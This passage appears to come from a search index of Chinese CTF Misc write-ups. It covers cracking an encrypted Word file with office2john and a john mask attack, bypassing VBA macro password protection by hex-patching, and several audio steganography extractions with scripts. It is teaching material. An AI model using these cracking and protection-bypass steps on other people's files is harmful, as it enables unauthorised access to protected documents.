<p>\u9898\u76ee\u4e2d\u7684\u7248\u672c\u5e94\u8be5 5.x\uff0c\u5c06 <code>84</code> \u6539\u4e3a <code>80</code> \u5373\u53ef</p> <p>\uff08WinRAR \u6216\u8005 ForeMost \u5747\u53ef\u76f4\u63a5\u63d0\u53d6\u56fe\u7247\uff09</p> <p></p>"},{"location":"Misc/Chapter3/3-9/","title":"\u52a0\u5bc6 Word \u7206\u7834","text":""},{"location":"Misc/Chapter3/3-9/#\u52a0\u5bc6-word-\u7206\u7834","title":"\u52a0\u5bc6 Word \u7206\u7834","text":"<p>\u89e3\u538b\u7f29\u6709\u4e09\u4e2a\u6587\u4ef6</p> <p></p> <p>\u9996\u5148\u662f hint.txt</p> <pre><code>The length of docm 's password is 6\nThe Regular Expression of the password is:\n[a-z] [a-z] q [a-z] b [a-z]\n</code></pre> <p>\u5f97\u77e5 <code>password.docm</code> \u5bc6\u7801\u5168\u5c0f\u5199\u5b57\u6bcd\uff0c\u4e14\u6ee1\u8db3 <code>??q?b?</code>\uff0c\u4f7f\u7528 john \u7206\u7834\uff08\u5f53\u7136\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528 Archpr\uff09</p> <p>\u5c06 Office \u6587\u6863\u4e2d\u7684\u54c8\u5e0c\u63d0\u53d6\u51fa\u6765\uff0c\u4fdd\u5b58\u4e3a <code>hash.txt</code></p> <pre><code>office2john password.docm &gt; word.hash\n</code></pre> <p>\u4f7f\u7528 \u63a9\u7801\u653b\u51fb\uff08mask attack\uff09 \u5c1d\u8bd5\u7206\u7834 <code>hash.txt</code> \u4e2d\u7684\u5bc6\u7801\u54c8\u5e0c</p> <pre><code>john --mask='?l?lq?lb?l' word.hash\n# ?l \u8868\u793a \u5c0f\u5199\u5b57\u6bcd\uff08a-z\uff09\n# q \u548c b \u662f\u56fa\u5b9a\u5b57\u7b26\n</code></pre> <p></p> <p>\u6253\u5f00 word</p> <p></p> <p>\u5f97\u5148\u7834\u89e3\u5b8f\uff0c\u5c06 word \u6587\u4ef6\u7528\u538b\u7f29\u5305\u65b9\u5f0f\u6253\u5f00\uff0c\u627e\u5230 <code>vbaProject.bin</code> \u6587\u4ef6\u4ee5\u5341\u516d\u8fdb\u5236\u65b9\u5f0f\u67e5\u770b\uff0c\u5c06  <code>DBP</code>  \u6539\u4e3a  <code>DBX</code>  \u5e76\u4fdd\u5b58\uff0c\u53c2\u8003\u535a\u5ba2</p> <p></p> <p>\u6ce8\u610f\u4e0d\u8981\u51cf\u5c11\u6216\u8005\u589e\u52a0\u5176\u4ed6\u5b57\u7b26\uff0c\u4fdd\u5b58\u9000\u51fa</p> <p></p> <p>\u91cd\u65b0\u6253\u5f00\u6587\u4ef6\uff0cAlt + F11\u6253\u5f00</p> <p></p> <p>\u53f3\u952e\u6253\u5f00\u5c5e\u6027\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u5bc6\u7801\u4fdd\u5b58\uff0c\u91cd\u65b0\u6253\u5f00\u6587\u4ef6 Alt + F11 \u8f93\u5165\u5bc6\u7801\u5373\u53ef\u67e5\u770b\u5b8f\u4ee3\u7801</p> <p></p> <pre><code>Private Sub CB_OK_Click()\nDim strpasw As String\nDim strdec As String\nDim strusrinput As String\nDim t As String\nt = ChrW(21152) &amp; ChrW(27833) &amp; ChrW(21543) &amp; ChrW(65292) &amp; ChrW(21516) &amp; ChrW(23398) &amp; ChrW(20204) &amp; ChrW(65281)\n\nstrusrinput = Dialog.TextBox_Pasw\nDim sinput As String\nsinput = strusrinput\n\nIf (strusrinput &lt;&gt; \"\") Then\n  strusout = Encode(strusrinput, t)\n  If (strusout = \"\u2524\u2121\u01d2q\uff58~\") Then\n      strdec = Decode(Dialog.Label_ls.Caption, sinput)\n  Else\n     If (strusout = \"\uff4bGJE\uff47\uff51\") Then\n        strdec = Decode(Dialog.Label_ls1.Caption, sinput)\n     Else\n          If (strusout = \"\u042e\u039fopz+\") Then\n             strdec = Decode(Dialog.Label_ls2.Caption, sinput)\n          Else\n                If (strusout = \"\uff5a\u039ajr\u0428\u03c6\u03b5\u3042\") Then\n                    strdec = Decode(Dialog.Label_ls4.Caption, sinput)\n                Else\n                    If (strusout = \"\u00e0\u01d6t\uff35\uff57\u2527\uff48\u00e8\") Then\n                          strdec = Decode(Dialog.Label_ls3.Caption, sinput)\n                    Else\n                          strdec = StrConv(t, vbFromUnicode)\n                    End If\n                End If\n           End If\n      End If\n   End If\n   Label_CLUE.Caption = strdec\nEnd If\n</code></pre> <p>\u65e0\u9700\u5206\u6790\u52a0\u89e3\u5bc6\u7b97\u6cd5\uff0c\u8f93\u51fa\u7ed3\u679c <code>strusout</code> \u7531 <code>Encode(strusrinput, t)</code> \u52a0\u5bc6\u5f97\u5230\uff0c\u53ea\u9700\u5206\u522b\u7528\u89e3\u5bc6\u51fd\u6570\u53cd\u63a8\u4e94\u4e2a if \u5206\u652f\u6761\u4ef6\u5bf9\u5e94\u7684\u660e\u6587\u5373\u53ef</p> <p>\u4fee\u6539 <code>Label_CLUE.Caption = strdec</code> \u4e3a <code>Label_CLUE.Caption = Decode(xxx,t)</code>\uff0c\u56de\u5230 word \u8fd0\u884c <code>AutoOpen</code> \u5b8f</p> <p>\u968f\u4fbf\u8f93\u5165\u5b57\u7b26\u70b9\u51fb\u786e\u5b9a\u5373\u53ef\u5728 Dialog \u7684 label \u5904\u663e\u793a\u5bf9\u5e94\u660e\u6587\uff0c\u5206\u522b\u662f <code>123456</code>\u3001<code>aaaaaa</code>\u3001<code>000000</code>\u3001<code>\u5899\u89d2\u6570\u679d</code>\u3001<code>iloveyou</code></p> <p>\u5c06 <code>Label_CLUE.Caption = Decode(xxx,t)</code> \u6539\u56de <code>Label_CLUE.Caption = strdec</code>\uff0c\u5206\u522b\u8f93\u5165\u4e94\u6bb5\u660e\u6587\uff0c\u53d1\u73b0\u8f93\u5165 <code>\u5899\u89d2\u6570\u679d</code> \u5f97\u5230 <code>\u89e3\u538b\u5bc6\u7801\uff1a\u4e24\u53ea\u9ec4\u9e42\u9e23\u7fe0\u67f3,\u4e00\u884c\u767d\u9e6d\u4e0a\u9752\u5929!</code></p> <p>\u7ed3\u5408 word \u91cc\u7684 hint <code>Rar \u5bc6\u7801\u4e3a\u590d\u6742\u578b\uff0c\u957f\u5ea6\u4e3a16\u4f4d\uff0c\u5305\u542b\u4e86\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u7b26\u53f7\u3002</code></p> <p>\u538b\u7f29\u5305\u5bc6\u7801\u731c\u51fa\u4e3a <code>2zhlmcl,1hblsqt.</code>\uff0c\u89e3\u538b\u62ff\u5230 flag\uff1a<code>Dest0g3{VBScr1pt_And_Hashc4t_1s_g00d}</code></p> <p>\u53c2\u8003\u535a\u5ba2</p>"},{"location":"Misc/Chapter4/","title":"Index","text":""},{"location":"Misc/Chapter4/#albert-gonzalez","title":"Albert Gonzalez","text":"<p>\u963f\u5c14\u4f2f\u7279\u00b7\u5188\u8428\u96f7\u65af\u662f\u4e00\u540d\u7f8e\u56fd\u8ba1\u7b97\u673a\u9ed1\u5ba2\u3001\u8ba1\u7b97\u673a\u7f6a\u72af\u548c\u8b66\u65b9\u7ebf\u4eba</p> <p>\u5728\u79d1\u5c14\u5c3c\uff0c\u4ed6\u88ab\u6307\u63a7\u4e3a ShadowCrew \u9ed1\u5ba2\u96c6\u56e2\u7684\u4e3b\u8c0b\uff0c\u8be5\u96c6\u56e2\u8d29\u5356\u4e86 150 \u4e07\u4e2a\u88ab\u76d7\u7684\u4fe1\u7528\u5361\u548c ATM \u5361\u53f7</p> <p>\u5728\u4e0e\u7279\u52e4\u5c40\u5408\u4f5c\u7684\u540c\u65f6\uff0c\u636e\u79f0\u4ed6\u7b56\u5212\u4e86\u5bf9 TJX \u516c\u53f8\u7684\u9ed1\u5ba2\u653b\u51fb\uff0c\u5728\u622a\u81f3 2007 \u5e74\u7684 18 \u4e2a\u6708\u5185\uff0c4560 \u4e07\u5f20\u4fe1\u7528\u5361\u548c\u501f\u8bb0\u5361\u53f7\u88ab\u76d7</p> <p>2008 \u5e74 5 \u6708 7 \u65e5\uff0c\u5188\u8428\u96f7\u65af\u56e0\u4ece\u7ebd\u7ea6\u5dde Islandia \u4e00\u5bb6\u9910\u5385\u7684\u9500\u552e\u70b9\u4fb5\u5165Dave &amp; Buster \u516c\u53f8\u7f51\u7edc\u800c\u88ab\u6355\u3002\u8be5\u4e8b\u4ef6\u53d1\u751f\u5728 2007 \u5e74 9 \u6708\u3002\u7ea6\u6709 5000 \u5f20\u5361\u53f7\u88ab\u76d7\u3002\u636e\u62a5\u544a\uff0c\u5176\u4e2d 675 \u5f20\u5361\u88ab\u76d7\u4ea4\u6613\u603b\u989d\u8fbe 600,000 \u7f8e\u5143</p> <p></p>"},{"location":"Misc/Chapter4/4-1/","title":"MP3 \u9690\u5199\uff08Key\uff09","text":""},{"location":"Misc/Chapter4/4-1/#mp3-\u9690\u5199key","title":"MP3 \u9690\u5199\uff08Key\uff09","text":"<p>\u8fd9\u662f MP3 \u6700\u5e38\u89c1\u7684\u9690\u5199\u65b9\u6cd5\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 MP3Stego \u5de5\u5177\u8fdb\u884c\u9690\u5199 </p> <p>\u4e0b\u8f7d\u6587\u4ef6\u540e\u662f\u4e00\u6bb5 MP3 \u97f3\u9891\uff0c\u540c\u65f6\u9898\u76ee\u7ed9\u51fa\u4e86 key\uff1asyclovergeek</p> <p>\u56e0\u4e3a MP3Stego \u5de5\u5177\u9690\u5199\u662f\u9700\u8981\u5bc6\u7801\u7684\uff0c\u90a3\u4e48\u53ef\u4ee5\u5148\u5c1d\u8bd5\u4f7f\u7528\u5de5\u5177\u89e3\u5bc6\u63d0\u53d6</p> <pre><code>Decode.exe -X -P syclovergeek mp3\n</code></pre> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter4/4-10/","title":"Wav \u6587\u4ef6 LSB \u9690\u5199","text":""},{"location":"Misc/Chapter4/4-10/#wav-\u6587\u4ef6-lsb-\u9690\u5199","title":"Wav \u6587\u4ef6 LSB \u9690\u5199","text":"<p>\u4e0b\u8f7d\u6587\u4ef6\u53d1\u73b0\u662f Wav \u6587\u4ef6\uff0c\u9898\u76ee\u63d0\u793a\u662f LSB \u9690\u5199</p> <p>\u4f7f\u7528 Wav \u6587\u4ef6 LSB \u9690\u5199\u5de5\u5177\uff1aStegolsb</p> <pre><code>-h\uff1a\u9690\u85cf\u58f0\u97f3\u6587\u4ef6\u4e2d\u7684\u6570\u636e\n-r\uff1a\u4ece\u58f0\u97f3\u6587\u4ef6\u4e2d\u6062\u590d\u6570\u636e\n-i text\uff1a\u6587\u4ef6\u7684\u8def\u5f84\n-s text\uff1a\u9690\u85cf\u5728\u58f0\u97f3\u6587\u4ef6\u4e2d\u7684\u6587\u4ef6\u8def\u5f84\n-o text\uff1a\u8f93\u51fa\u6587\u4ef6\u7684\u8def\u5f84\n-n integer\uff1a\u4f7f\u7528\u591a\u5c11\u4e2a LSB [\u9ed8\u8ba4\u503c\uff1a2]\n-b integer\uff1a\u4ece\u58f0\u97f3\u6587\u4ef6\u4e2d\u6062\u590d\u591a\u5c11\u5b57\u8282\n</code></pre> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter4/4-11/","title":"\u6162\u626b\u63cf\u7535\u89c6\u9690\u5199","text":""},{"location":"Misc/Chapter4/4-11/#\u6162\u626b\u63cf\u7535\u89c6\u9690\u5199","title":"\u6162\u626b\u63cf\u7535\u89c6\u9690\u5199","text":"<p>\u9898\u76ee\u540d\u63d0\u793a\u4e86\u4fe1\u53f7\u7c7b\u578b</p> <p></p> <p>\u5c06 MP3 \u6587\u4ef6\u5916\u653e\uff0c\u4fbf\u53ef\u4ee5\u5f97\u5230\u4e00\u5f20\u56fe\u7247\uff08\u4e00\u5b9a\u8981\u5b89\u9759\uff09</p> <p></p> <p>\u5f97\u5230\u5b57\u7b26</p> <pre><code>f7liavga{1M_0105n_cC@okmei_nFge!s}\n</code></pre> <p>\u6700\u540e\u6805\u680f\u89e3\u5bc6</p> <p></p>"},{"location":"Misc/Chapter4/4-12/","title":"Private Bit \u9690\u5199","text":""},{"location":"Misc/Chapter4/4-12/#private-bit-\u9690\u5199","title":"Private Bit \u9690\u5199","text":"<p>\u4f7f\u7528 010 \u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u5b58\u5728\u4fdd\u7559\u5b57\u4f4d private bit</p> <p></p> <p>\u7b2c\u4e00\u4e2a\u662f 0\uff0c\u7b2c\u4e8c\u4e2a\u662f 1</p> <p>\u63d0\u524d\u524d\u516b\u4e2a\u5f97\u5230 01000110\uff0c\u8f6c\u4e3a ASCII \u7801\u662f F</p> <p>\u4ee5\u4e0b\u662f\u5bf9\u4e8e struct MPEG_FRAME mf \u7684\u89e3\u6790</p> \u540d\u79f0 \u957f\u5ea6 (bit) \u4f5c\u7528 syncword 12 \u540c\u6b65\u5934\uff0c\u8868\u793a\u4e00\u5e27\u6570\u636e\u7684\u5f00\u59cb\uff0c\u5171 12 \u4f4d\uff0c\u5168 1 \u5373 0xFFF ID 1 \u7b97\u6cd5\u6807\u8bc6\u4f4d\uff0c\"1\" \u8868\u793a MPEG \u97f3\u9891 layer 2 \u7528\u6765\u8bf4\u660e\u662f\u54ea\u4e00\u5c42\u7f16\u7801 protection_bit 1 \u7528\u6765\u8868\u660e\u5197\u4f59\u4fe1\u606f\u662f\u5426\u88ab\u52a0\u5230\u97f3\u9891\u6d41\u4e2d\uff0c\u4ee5\u8fdb\u884c\u9519\u8bef\u68c0\u6d4b\u548c\u9519\u8bef\u9690\u853d\uff1b\"1\" \u662f\u672a\u589e\u52a0\uff0c\"0\" \u662f\u589e\u52a0 bitrate_index 4 \u7528\u6765\u6307\u793a\u8be5\u5e27\u7684 bitrate sampling_frequency 2 \u7528\u6765\u6307\u793a\u91c7\u6837\u9891\u7387 padding_bit 1 \u5982\u679c\u8be5\u4f4d\u4e3a 1\uff0c\u90a3\u4e48\u5e27\u4e2d\u5305\u542b\u4e00\u4e2a\u989d\u5916\u69fd\uff0c\u7528\u4e8e\u628a\u5e73\u5747\u4f4d\u7387\u8c03\u8282\u5230\u91c7\u6837\u9891\u7387\uff0c\u5426\u5219\u8be5\u4f4d\u5fc5\u987b\u4e3a 0 private_bit 1 \u7559\u505a\u79c1\u7528 mode 2 \u5b9a\u4e49\u901a\u9053\u6a21\u5f0f mode_extension 2 \u7528\u6765\u6807\u8bc6\u91c7\u7528\u4e86\u54ea\u4e00\u79cd joint_stereo copyright 1 \u8868\u660e\u7248\u6743\u7528\uff0c\"1\" \u8868\u793a\u6709\u7248\u6743\uff0c\"0\" \u8868\u793a\u6ca1\u6709\u7248\u6743 original/home 1 \u8868\u660e\u539f\u7248\u8fd8\u662f\u590d\u5236\uff0c\"1\" \u8868\u793a\u539f\u7248\uff0c\"0\" \u8868\u793a\u590d\u5236 emphasis 2 \u8868\u660e\u52a0\u91cd\u97f3\u7c7b\u578b <p>\u4e00\u4e2a mf \u7684 HEADER \u603b\u5171 12+1+2+1+4+2+1+1+2+2+1+1+2=32\uff0c\u5373\u603b\u5171 4 \u5b57\u8282</p> <p>private_bit \u4e3a 24\uff0c\u6240\u5728\u7684\u5b57\u8282\u4e3a\u7b2c 3 \u4e2a\u5b57\u8282\uff0c\u56e0\u6b64\u8be5\u5b57\u8282\u5bf9\u5e94\u7684\u5730\u5740\u4e3a 235984+2=235986\uff0c\u5373\u4e3a\u7b2c\u4e00\u4e2a private_bit \u5f00\u59cb\u5730\u5740</p> <p>\u53ef\u4ee5\u53d1\u73b0\u5728\u6bcf\u4e2a MPEG_FRAME mf \u4e0b\u7684 4 \u5b57\u8282 MPEG_HEADER mpeg_hdr \u4e2d\u7684\u7b2c 24 \u4e2a bit \u6709\u4e00\u4e2a private bit</p> <p>\u89c2\u5bdf\u6bcf\u4e00\u4e2a mf \u7ec4,\u5927\u5c0f\u4e3a 417 \u6216 418 \u5b57\u8282\uff0c\u56e0\u6b64\u9700\u8981\u7f16\u5199\u811a\u672c</p> <pre><code>import re\n\ndef extract_hidden_data(file_path):\n    # ========== \u53c2\u6570\u8bbe\u7f6e\u90e8\u5206 ==========\n    # \u521d\u59cb\u8bfb\u53d6\u4f4d\u7f6e(\u7b2c\u4e00\u4e2a private bit \u7684\u8d77\u59cb\u4f4d\u7f6e)\n    start_pos = 235986\n    # \u7ed3\u675f\u8bfb\u53d6\u4f4d\u7f6e(\u901a\u8fc7\u5206\u6790\u53d1\u73b0\u6b64\u4f4d\u7f6e\u540e private_bit \u90fd\u4e3a 0)\n    end_pos = 1369844\n    # \u57fa\u672c\u7ec4\u5927\u5c0f\n    group_size = 417\n    # \u9700\u8981\u8df3\u8fc7\u989d\u5916\u5b57\u8282\u7684\u4f4d\u7f6e\u96c6\u5408(\u4f7f\u7528\u96c6\u5408\u63d0\u9ad8\u67e5\u627e\u6548\u7387)\n    skip_positions = {0, 1, 26, 50, 75, 99, 124, 148, 173, 197,\n                      222, 246, 271, 295, 320, 344, 369, 393, 418}\n\n    # ========== \u6570\u636e\u63d0\u53d6\u90e8\u5206 ==========\n    binary_data = []  # \u7528\u4e8e\u5b58\u50a8\u63d0\u53d6\u7684\u4e8c\u8fdb\u5236\u4f4d\n    current_pos = start_pos  # \u5f53\u524d\u6587\u4ef6\u6307\u9488\u4f4d\u7f6e\n    counter = 0  # \u4f4d\u7f6e\u8ba1\u6570\u5668\n\n    with open(file_path, 'rb') as file:\n        while current_pos &lt; end_pos:\n            # \u79fb\u52a8\u6587\u4ef6\u6307\u9488\u5230\u5f53\u524d\u4f4d\u7f6e\n            file.seek(current_pos)\n\n            # \u51b3\u5b9a\u524d\u8fdb\u7684\u6b65\u957f:\n            # - \u5982\u679c\u5728 skip_positions \u4e2d\uff0c\u524d\u8fdb group_size(417)\n            # - \u5426\u5219\u524d\u8fdb group_size + 1(418)\n            step = group_size if counter in skip_positions else group_size + 1\n            current_pos += step\n\n            # \u8bfb\u53d6 1 \u4e2a\u5b57\u8282\n            byte = file.read(1)\n            if not byte:  # \u5982\u679c\u8bfb\u5230\u6587\u4ef6\u672b\u5c3e\u5219\u7ec8\u6b62\n                break\n\n            # \u63d0\u53d6\u5b57\u8282\u7684\u6700\u540e\u4e00\u4f4d(\u4f7f\u7528\u4f4d\u8fd0\u7b97\u6bd4bin()\u66f4\u9ad8\u6548):\n            # 1. ord(byte) \u83b7\u53d6\u5b57\u8282\u7684\u6574\u6570\u503c\n            # 2. &amp; 1 \u83b7\u53d6\u6700\u4f4e\u4f4d\n            # 3. str()\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\u5f62\u5f0f('0'\u6216'1')\n            binary_data.append(str(ord(byte) &amp; 1))\n\n            counter += 1  # \u4f4d\u7f6e\u8ba1\u6570\u5668\u9012\u589e\n\n    # ========== \u6570\u636e\u5904\u7406\u90e8\u5206 ==========\n    # \u5c06\u4e8c\u8fdb\u5236\u4f4d\u5217\u8868\u62fc\u63a5\u6210\u5b57\u7b26\u4e32\n    binary_str = ''.join(binary_data)\n\n    # \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5c06\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u6309 8 \u4f4d\u4e00\u7ec4\u5206\u5272\n    # \u7136\u540e\u5c06\u6bcf\u7ec4\u4e8c\u8fdb\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684 ASCII \u5b57\u7b26\n    hidden_text = ''.join([\n        chr(int(byte, 2))  # \u5c06 8 \u4f4d\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6574\u6570\u518d\u8f6c\u6362\u4e3a\u5b57\u7b26\n        for byte in re.findall('.{8}', binary_str)  # \u6bcf 8 \u4f4d\u5206\u5272\n    ])\n\n    # \u8fd4\u56de\u5904\u7406\u540e\u7684\u6587\u672c(\u53bb\u9664\u9996\u5c3e\u7a7a\u767d\u5b57\u7b26)\n    return hidden_text.strip()\n\n\nif __name__ == '__main__':\n    result = extract_hidden_data('1.mp3')\n    print(result)\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Misc/Chapter4/4-13/","title":"\u91c7\u6837\u7387\u9690\u5199","text":""},{"location":"Misc/Chapter4/4-13/#\u91c7\u6837\u7387\u9690\u5199","title":"\u91c7\u6837\u7387\u9690\u5199","text":"<p>\u653e\u5165 Audacity \u4e2d\u6ca1\u6709\u7ebf\u7d22</p> <p></p> <p>\u8c03\u6574\u91c7\u6837\u7387\u770b\u770b</p> <p></p> <p>\u8bbe\u7f6e\u4e3a 900</p> <p></p> <p>\u518d\u67e5\u770b\u9891\u8c31\u56fe\u5c31\u6709\u4e86</p> <p></p>"},{"location":"Misc/Chapter4/4-14/","title":"Raw \u65e0\u7ebf\u7535 AFSK1200 \u9690\u5199","text":""},{"location":"Misc/Chapter4/4-14/#raw-\u65e0\u7ebf\u7535-afsk1200-\u9690\u5199","title":"Raw \u65e0\u7ebf\u7535 AFSK1200 \u9690\u5199","text":"<p>\u5148\u770b\u6587\u4ef6\u7c7b\u578b</p> <p></p> <p>\u57281100 Hz \u548c 2200 Hz \u5904\u6709\u4e24\u4e2a\u5cf0\u503c</p> <p>\u8fd9\u662f AX.25 \u7684 BFSK \u4e2d\u4f7f\u7528\u7684\u4e24\u4e2a\u97f3\u8c03</p> <p></p> <p>\u9996\u5148\u8f6c\u6362\u7c7b\u578b</p> <p>\u9700\u8981\u5148\u7528 <code>sox</code> \u628a wav \u8f6c\u4e3a raw</p> <pre><code>sox -t wav 997a0b28705f4ef086acfb7e1b932336 -esigned-integer -b16 -r 22050 -t raw latlong.raw\n\n# sox: \u8c03\u7528 SoX \u97f3\u9891\u5904\u7406\u5de5\u5177\n# -t wav: \u6307\u5b9a\u8f93\u5165\u6587\u4ef6\u7684\u7c7b\u578b\u4e3a WAV \u683c\u5f0f\n# 997a0b28705f4ef086acfb7e1b932336: \u8f93\u5165\u6587\u4ef6\u540d\uff08\u770b\u8d77\u6765\u50cf\u662f\u4e00\u4e2a\u54c8\u5e0c\u503c\u547d\u540d\u7684 WAV \u6587\u4ef6\uff09\n# -esigned-integer: \u6307\u5b9a\u8f93\u51fa\u97f3\u9891\u7684\u7f16\u7801\u683c\u5f0f\u4e3a\u6709\u7b26\u53f7\u6574\u6570\n# -b16: \u6307\u5b9a\u8f93\u51fa\u97f3\u9891\u7684\u4f4d\u6df1\u4e3a 16 \u4f4d\uff08\u5373\u6bcf\u4e2a\u6837\u672c\u5360 16 \u4f4d\uff09\n# -r 22050: \u6307\u5b9a\u8f93\u51fa\u97f3\u9891\u7684\u91c7\u6837\u7387\u4e3a 22050 Hz\n# -t raw: \u6307\u5b9a\u8f93\u51fa\u6587\u4ef6\u7684\u7c7b\u578b\u4e3a RAW\uff08\u539f\u59cb\u97f3\u9891\u6570\u636e\uff0c\u65e0\u6587\u4ef6\u5934\uff09\n# latlong.raw: \u8f93\u51fa\u6587\u4ef6\u540d\n</code></pre> <p></p> <p>\u518d\u4f7f\u7528\u5de5\u5177 <code>multimon-ng</code> \u89e3\u5bc6</p> <pre><code>multimon-ng -t raw -a AFSK1200 latlong.raw\n\n# -t \u6307\u5b9a\u8f93\u5165\u6587\u4ef6\u7684\u7c7b\u578b\n# -a \u6307\u5b9a\u8981\u4f7f\u7528\u7684\u89e3\u7801\u534f\u8bae\n# AFSK1200 \u8868\u793a\u89e3\u7801 1200 bps \u7684\u97f3\u9891\u9891\u79fb\u952e\u63a7\uff08Audio Frequency-Shift Keying\uff09 \u4fe1\u53f7\uff0c\u8fd9\u662f APRS\uff08\u81ea\u52a8\u5206\u7ec4\u62a5\u544a\u7cfb\u7edf\uff09\u7b49\u534f\u8bae\u5e38\u7528\u7684\u8c03\u5236\u65b9\u5f0f\n</code></pre> <p></p>"},{"location":"Misc/Chapter4/4-15/","title":"DeEgger Embedder \u9690\u5199","text":""},{"location":"Misc/Chapter4/4-15/#deegger-embedder-\u9690\u5199","title":"DeEgger Embedder \u9690\u5199","text":"<p>\u9898\u76ee\u9644\u4ef6\u7ed9\u4e86\u4e00\u4e2a\u540e\u7f00\u4e3a .pyc \u6587\u4ef6\uff0c010 \u6253\u5f00\u4ed4\u7ec6\u67e5\u770b\u6570\u636e\uff0c\u53d1\u73b0\u6709\u5012\u7f6e\u7684 flag1 \u548c flag2</p> <p></p> <p>\u56e0\u6b64\u6211\u4eec\u5199\u4e2a python \u811a\u672c\u5c06\u6570\u636e\u5012\u7f6e\u56de\u6765</p> <p>\u7136\u540e foremost \u4e00\u4e0b\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u4f2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305</p> <p></p> <p>\u538b\u7f29\u5305\u7684\u6ce8\u91ca\u4e2d\u6709 flag1 \u548c flag2</p> <p></p> <p>\u53bb\u9664\u4f2a\u52a0\u5bc6\u540e\u89e3\u538b\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a Dream It Possible.mp3</p> <p></p> <p>\u8fd9\u91cc\u9700\u8981\u4f7f\u7528 DeEgger Embedder \u63d0\u53d6\u51fa\u9690\u85cf\u7684\u6570\u636e</p> <p></p> <p>\u7528\u4e0a\u9762\u90a3\u4e2a\u5de5\u5177\u53ef\u4ee5\u63d0\u53d6\u51fa\u4e00\u5927\u4e32 base32 \u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff0c\u76f4\u63a5\u89e3\u7801\u53d1\u73b0\u6ca1\u6709\u5f97\u5230\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f</p> <p>\u5c1d\u8bd5 base32 \u9690\u5199\u89e3\u5bc6</p> <pre><code>import base64\n\ndef get_base32_diff_value(stego_line, normal_line):\n    base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\n    for i in range(len(normal_line)):\n        if stego_line[i] != normal_line[i]:\n            return abs(base32chars.index(chr(stego_line[i]))-base32chars.index(chr(normal_line[i])))\n    return 0\n\n# base32 \u9690\u5199\u89e3\u5bc6\ndef base32stego_decode(lines):\n    res = ''\n    for i in lines:\n        stego_line = i.strip()\n        normal_line = base64.b32encode(base64.b32decode(i.strip()))\n        diff = get_base32_diff_value(stego_line, normal_line)\n        if '=' not in str(stego_line):\n            continue\n        if diff:\n            res += bin(diff)[2:]\n        else:\n            res += '0'\n    return res\n\nwith open(\"Dream It Possible - extracted.txt\", 'rb') as f:\n    file_lines = f.readlines()\nen=open(\"encrypt.txt\",\"w\")\nen.write(base32stego_decode(file_lines))\nen.close()\n</code></pre> <p>\u63d0\u53d6 base32 \u9690\u5199\u7684\u6570\u636e\u53ef\u4ee5\u5f97\u5230\u4e00\u5927\u4e32\u4e8c\u8fdb\u5236\u7684\u5b57\u7b26\uff0c\u8fd9\u91cc\u8fd8\u4e0d\u77e5\u9053\u5177\u4f53\u5e72\u5565\u7528\uff0c\u8f6c\u56fe\u7247\u4e5f\u6ca1\u6709\u53d1\u73b0\u6709\u7528\u7684\u4fe1\u606f</p> <p>\u56e0\u6b64\u6211\u4eec\u56de\u5934\u5206\u6790\u90a3\u4e2a pyc \u6587\u4ef6\uff0c\u76f4\u63a5\u4f7f\u7528 uncompyle6 \u5c31\u53ef\u4ee5\u53cd\u7f16\u8bd1\u51fa\u539f\u6765\u7684 Python \u6e90\u7801</p> <pre><code># uncompyle6 version 3.9.1\n# Python bytecode version base 2.7 (62211)\n# Decompiled from: Python 3.8.10 (tags/v3.8.10:3d8993a, May  3 2021, 11:48:03) [MSC v.1928 64 bit (AMD64)]\n# Embedded file name: Fl4g.py\n# Compiled at: 2017-07-02 00:15:33\nfrom os import urandom\n\ndef generate(m, k):\n    result = 0\n    for i in bin(m ^ k)[2:]:\n        result = result &lt;&lt; 1\n        if int(i):\n            result = result ^ m ^ k\n        if result &gt;&gt; 256:\n            result = result ^ P\n\n    return result\n\n\ndef encrypt(seed):\n    key = int(urandom(32).encode('hex'), 16)\n    while True:\n        yield key\n        key = generate(key, seed) + 233333333333L\n\n\ndef convert(string):\n    return int(string.encode('hex'), 16)\n\n\nP = 115792089237316195423570985008687907853269984665640564039457584007913129640997L\nflag1 = 'ThIs_Fl4g_Is_Ri9ht'\nflag2 = 'Hey_Fl4g_Is_Not_HeRe'\nkey = int(urandom(32).encode('hex'), 16)\ndata = open('data.txt', 'r').read()\nresult = encrypt(key)\nencrypt1 = bin(int(data, 2) ^ eval('0x' + hex(result.next())[2:-1] * 22))[2:]\nencrypt2 = hex(convert(flag1) ^ result.next())[2:-1]\nencrypt3 = hex(convert(flag2) ^ result.next())[2:-1]\nprint 'flag1:', encrypt2\nprint 'flag2:', encrypt3\nf = open('encrypt.txt', 'w')\nf.write(encrypt1)\nf.close()\n\n# okay decompiling .\\reverse_1_PyHaHa.pyc\n</code></pre> <p>\u7531\u4e0a\u8ff0\u4ee3\u7801\u53ef\u77e5\u6211\u4eec\u4e4b\u524d\u5f97\u5230\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u5e94\u8be5\u5c31\u662f\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u7684 encrypt.txt</p> <p>\u56e0\u6b64\u6211\u4eec\u5199\u4e00\u4e2a Python \u811a\u672c\u53bb\u8fd8\u539f\u51fa\u539f\u6765\u7684\u6570\u636e\uff0c\u5177\u4f53\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>from PIL import Image\nimport libnum\nimport os\n\n\ndef generate(m, k):\n    result = 0\n    for i in bin(m ^ k)[2:]:\n        result = result &lt;&lt; 1\n        if int(i):\n            